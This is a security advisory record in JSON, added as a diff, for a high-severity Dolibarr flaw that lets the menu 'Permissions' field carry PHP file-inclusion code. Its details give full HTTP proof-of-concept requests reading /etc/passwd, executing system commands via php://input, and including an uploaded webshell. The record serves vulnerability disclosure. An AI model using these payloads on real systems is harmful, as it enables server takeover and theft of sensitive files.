@@ -1,0 +1,180 @@
+{
+  "affected": [
+    {
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/07/GHSA-49xw-hw94-fmv2/GHSA-49xw-hw94-fmv2.json"
+      },
+      "package": {
+        "ecosystem": "Packagist",
+        "name": "dolibarr/dolibarr",
+        "purl": "pkg:composer/dolibarr/dolibarr"
+      },
+      "ranges": [
+        {
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "last_affected": "21.0.2"
+            }
+          ],
+          "type": "ECOSYSTEM"
+        }
+      ],
+      "versions": [
+        "10.0.0",
+        "10.0.1",
+        "10.0.2",
+        "10.0.3",
+        "10.0.4",
+        "10.0.5",
+        "10.0.6",
+        "10.0.7",
+        "11.0.0",
+        "11.0.1",
+        "11.0.2",
+        "11.0.3",
+        "11.0.4",
+        "11.0.5",
+        "12.0.0",
+        "12.0.1",
+        "12.0.2",
+        "12.0.3",
+        "12.0.4",
+        "12.0.5",
+        "13.0.0",
+        "13.0.1",
+        "13.0.2",
+        "13.0.3",
+        "13.0.4",
+        "13.0.5",
+        "14.0.0",
+        "14.0.1",
+        "14.0.2",
+        "14.0.3",
+        "14.0.4",
+        "14.0.5",
+        "15.0.0",
+        "15.0.1",
+        "15.0.2",
+        "15.0.3",
+        "3.6.0",
+        "3.6.0-beta",
+        "3.6.1",
+        "3.6.2",
+        "3.6.3",
+        "3.6.4",
+        "3.6.5",
+        "3.6.6",
+        "3.7.0",
+        "3.7.1",
+        "3.7.2",
+        "3.7.3",
+        "3.7.4",
+        "3.8.0",
+        "3.8.0-beta",
+        "3.8.1",
+        "3.8.2",
+        "3.8.3",
+        "3.8.4",
+        "3.9.0",
+        "3.9.0-rc",
+        "3.9.0-rc2",
+        "3.9.1",
+        "3.9.2",
+        "3.9.3",
+        "3.9.4",
+        "4.0.0",
+        "4.0.0-beta",
+        "4.0.0-rc",
+        "4.0.0-rc2",
+        "4.0.1",
+        "4.0.2",
+        "4.0.3",
+        "4.0.4",
+        "4.0.5",
+        "4.0.6",
+        "5.0.0",
+        "5.0.0-beta",
+        "5.0.0-rc1",
+        "5.0.0-rc2",
+        "5.0.1",
+        "5.0.2",
+        "5.0.3",
+        "5.0.4",
+        "5.0.5",
+        "5.0.6",
+        "5.0.7",
+        "6.0.0",
+        "6.0.0-beta",
+        "6.0.0-rc",
+        "6.0.1",
+        "6.0.2",
+        "6.0.3",
+        "6.0.4",
+        "6.0.5",
+        "6.0.6",
+        "6.0.7",
+        "6.0.8",
+        "7.0.0",
+        "7.0.1",
+        "7.0.2",
+        "7.0.3",
+        "7.0.4",
+        "7.0.5",
+        "8.0.0",
+        "8.0.1",
+        "8.0.2",
+        "8.0.3",
+        "8.0.4",
+        "8.0.5",
+        "8.0.6",
+        "9.0.0",
+        "9.0.1",
+        "9.0.2",
+        "9.0.3",
+        "9.0.4"
+      ]
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-98"
+    ],
+    "github_reviewed": true,
+    "github_reviewed_at": "2025-07-21T19:29:09Z",
+    "nvd_published_at": null,
+    "severity": "HIGH"
+  },
+  "details": "# Summary\n\nThe Dolibarr backend provides the function of adding Menu, and supports setting permissions for the added Menu:\n\n![](https://raw.githubusercontent.com/wh0amitx/Misc/main/images/image-20240228164114688.png)\n\nThis is the trigger point of the vulnerability. The submitted permission can be php code, and it will be executed when viewing the created Menu:\n\n- htdocs/admin/menus/edit.php\n\n![](https://raw.githubusercontent.com/wh0amitx/Misc/main/images/image-20240228164445656.png)\n\nAs you can see, in edit.php, if the created menu is set to `$menu->perms`, the `dol_eval()` method will be called. Following the `dol_eval()` method, we can see that it will filter the dangerous php functions in `$menu->perms` through the blacklist set in `$forbiddenphpfunctions`:\n\n![](https://raw.githubusercontent.com/wh0amitx/Misc/main/images/image-20240228164725548.png)\n\nHowever, the blacklist here is not comprehensive. For example, the `include_once` and `require_once` functions can easily pass the blacklist check, which will cause file inclusion vulnerabilities. Moreover, if the `allow_url_include` option is enabled in php.ini, arbitrary code execution will occur. **The most serious thing is that we can cooperate with the file upload at `/htdocs/user/document.php?id=1&uploadform=1` to achieve more general arbitrary code execution.**\n\n# Proof of Concept\n\n## Local File Inclusion\n\n(1) First, create a Menu and set \"Permissions\" to `include_once('/etc/passwd')` (note that `''` must be used here because `\"` will be detected):\n\n```http\nPOST /htdocs/admin/menus/edit.php?action=add&token=fae63868ce9c2a7eece04a49ffdbe23f&menuId=0 HTTP/1.1\nHost: 192.168.31.31\nContent-Length: 210\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: http://192.168.31.31\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nReferer: http://192.168.31.31/htdocs/admin/menus/edit.php?menuId=0&action=create&menu_handler=all&backtopage=%2Fhtdocs%2Fadmin%2Fmenus%2Findex.php\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9,en;q=0.8,ru;q=0.7,ja;q=0.6\nCookie: DOLSESSID_cc5001a0224d79c07308a0908c6213b79e5d7d10=82ef3f1d798bf58a0e11c0cbacc390dd\nConnection: close\n\ntoken=fae63868ce9c2a7eece04a49ffdbe23f&menu_handler=all&user=2&type=top&propertymainmenu=test1test&titre=test1test&url=test1test&langs=&position=100&target=&enabled=1&perms=include_once('/etc/passwd')&save=Save\n```\n\n![](https://raw.githubusercontent.com/wh0amitx/Misc/main/images/image-20240228165411557.png)\n\n(2) Then we look at the Menu we just created, and we can see that the contents of `/etc/passwd` have been successfully read out:\n\n![](https://raw.githubusercontent.com/wh0amitx/Misc/main/images/image-20240228165517668.png)\n\n## Remote Code Execution - 1\n\n(1) We first ensure that the `allow_url_include` option of php.ini on the server is `On`:\n\n![](https://raw.githubusercontent.com/wh0amitx/Misc/main/images/image-20240228160154464.png)\n\nAt this point, we can use remote file inclusion and cooperate with `php://input` to achieve arbitrary code execution.\n\n(2) Create a Menu and set \"Permissions\" to `include_once('php://input')` (note that `''` must be used here because `\"` will be detected):\n\n```http\nPOST /htdocs/admin/menus/edit.php?action=add&token=fae63868ce9c2a7eece04a49ffdbe23f&menuId=0 HTTP/1.1\nHost: 192.168.31.31\nContent-Length: 210\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: http://192.168.31.31\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nReferer: http://192.168.31.31/htdocs/admin/menus/edit.php?menuId=0&action=create&menu_handler=all&backtopage=%2Fhtdocs%2Fadmin%2Fmenus%2Findex.php\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9,en;q=0.8,ru;q=0.7,ja;q=0.6\nCookie: DOLSESSID_cc5001a0224d79c07308a0908c6213b79e5d7d10=82ef3f1d798bf58a0e11c0cbacc390dd\nConnection: close\n\ntoken=fae63868ce9c2a7eece04a49ffdbe23f&menu_handler=all&user=2&type=top&propertymainmenu=test1test&titre=test1test&url=test1test&langs=&position=100&target=&enabled=1&perms=include_once('php://input')&save=Save\n```\n\n![](https://raw.githubusercontent.com/wh0amitx/Misc/main/images/image-20240228165822802.png)\n\n(3) Finally, the system command is successfully executed through the POST request:\n\n```http\nPOST http://192.168.31.31/htdocs/admin/menus/edit.php?menu_handler=all&action=edit&token=fae63868ce9c2a7eece04a49ffdbe23f&menuId=24 HTTP/1.1\nHost: 192.168.31.31\nContent-Length: 27\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: http://192.168.31.31\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nReferer: http://192.168.31.31/index.php?url=/etc/passwd\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9,en;q=0.8,ru;q=0.7,ja;q=0.6\nCookie: DOLSESSID_cc5001a0224d79c07308a0908c6213b79e5d7d10=82ef3f1d798bf58a0e11c0cbacc390dd\nConnection: close\n\n<?php system('ls -al /');?>\n```\n\n![](https://raw.githubusercontent.com/wh0amitx/Misc/main/images/image-20240228165923443.png)\n\n## Remote Code Execution - 2 (File Inclusion with file upload)\n\nAt this point, we are absolutely sure that a file inclusion vulnerability can be achieved by setting \"Permissions\", and arbitrary code execution can be achieved with `allow_url_include = On`. However, the setting `allow_url_include = On` does not exist on every server. Therefore, to achieve the purpose of universal arbitrary code execution, we need to cooperate with the file upload (without suffix) function.\n\n(1) We can upload a file containing php webshell code through the \"Attach a new file/document\" function in `/htdocs/user/document.php?id=1&uploadform=1`. The file name is \"shell\" (this file There must be no suffix, otherwise the detection of `.` by `dol_eval()` cannot be bypassed when setting \"Permissions\" later. Among all file upload points, only \"Attach a new file/document\" can be Upload files without suffix):\n\n![image-20240228232622397](https://raw.githubusercontent.com/wh0amitx/Misc/main/images/image-20240228232622397.png)\n\n(2) upload the \"shell\":\n\n![image-20240228231150328](https://raw.githubusercontent.com/wh0amitx/Misc/main/images/image-20240228231150328.png)\n\nImages uploaded from here will eventually be saved on the server in the \"/var/www/html/documents/users/1/\" directory:\n\n![image-20240228230738376](https://raw.githubusercontent.com/wh0amitx/Misc/main/images/image-20240228230738376.png)\n\n\uff083\uff09create a Menu and set \"Permissions\" to `include_once('/var/www/html/documents/users/1/shell')` (note that `''` must be used here because `\"` will be detected).\n\n```http\nPOST /htdocs/admin/menus/edit.php?action=add&token=fae63868ce9c2a7eece04a49ffdbe23f&menuId=0 HTTP/1.1\nHost: 192.168.31.31\nContent-Length: 210\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: http://192.168.31.31\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nReferer: http://192.168.31.31/htdocs/admin/menus/edit.php?menuId=0&action=create&menu_handler=all&backtopage=%2Fhtdocs%2Fadmin%2Fmenus%2Findex.php\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9,en;q=0.8,ru;q=0.7,ja;q=0.6\nCookie: DOLSESSID_cc5001a0224d79c07308a0908c6213b79e5d7d10=82ef3f1d798bf58a0e11c0cbacc390dd\nConnection: close\n\ntoken=e71337659d7cbae16b0279b4e04535aa&menu_handler=all&user=2&type=left&propertymainmenu=whaoamia&menuIdParent=123&titre=whaoamia&picto=whaoamia&url=whaoamia&langs=&position=100&enabled=1&perms=include_once('/var/www/html/documents/users/1/shell')&target=&save=Save\n```\n\n(4) Finally, when we access the Menu we just created, we can find that the \"/var/www/html/documents/users/1/shell\" file is included:\n\n![image-20240228231800914](https://raw.githubusercontent.com/wh0amitx/Misc/main/images/image-20240228231800914.png)\n\nFinally, arbitrary code execution was successfully achieved:\n\n![image-20240228231703417](https://raw.githubusercontent.com/wh0amitx/Misc/main/images/image-20240228231703417.png)\n\n![image-20240228232116013](https://raw.githubusercontent.com/wh0amitx/Misc/main/images/image-20240228232116013.png)\n\n# Impact\n\nThis vulnerability can run arbitrary commands in the file system and read sensitive files.\n\n# Say it at the end\n\nIf you confirm the vulnerability, please apply for a CVE to notify all users to update.",
+  "id": "GHSA-49xw-hw94-fmv2",
+  "modified": "2025-07-21T19:42:38.157821Z",
+  "published": "2025-07-21T19:29:09Z",
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/Dolibarr/dolibarr/security/advisories/GHSA-49xw-hw94-fmv2"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/Dolibarr/dolibarr"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/Dolibarr/dolibarr/blob/21.0.2/htdocs/admin/menus/edit.php"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/Dolibarr/dolibarr/blob/21.0.2/htdocs/user/document.php"
+    }
+  ],
+  "schema_version": "1.6.0",
+  "severity": [
+    {
+      "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+      "type": "CVSS_V3"
+    }
+  ],
+  "summary": "Dolibarr has Remote Code Execution Vulnerability (Bypass)"
+}
